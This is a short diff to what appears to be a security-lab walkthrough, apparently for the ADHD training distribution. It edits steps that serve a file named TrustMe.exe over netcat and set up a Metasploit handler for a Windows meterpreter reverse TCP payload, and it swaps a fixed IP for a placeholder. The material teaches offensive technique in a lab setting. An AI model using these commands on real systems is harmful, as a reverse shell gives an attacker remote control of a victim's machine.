@@ -47,7 +47,7 @@ Please note, the adhd password is adhd.
 
 `cd /tmp`
 
-/#`ls -l TrustMe.exe`
+`ls -l TrustMe.exe`
 
 `nc -l -p 2222 < TrustMe.exe`
 
@@ -66,7 +66,7 @@ msf5 exploit(multi/handler) > `set PAYLOAD windows/meterpreter/reverse_tcp`
 
 PAYLOAD => windows/meterpreter/reverse_tcp
 
-msf5 exploit(multi/handler) > `set LHOST 172.26.19.133`
+msf5 exploit(multi/handler) > `set LHOST <YOUR LINUX IP>`
 
 Remember, your IP will be different!
 
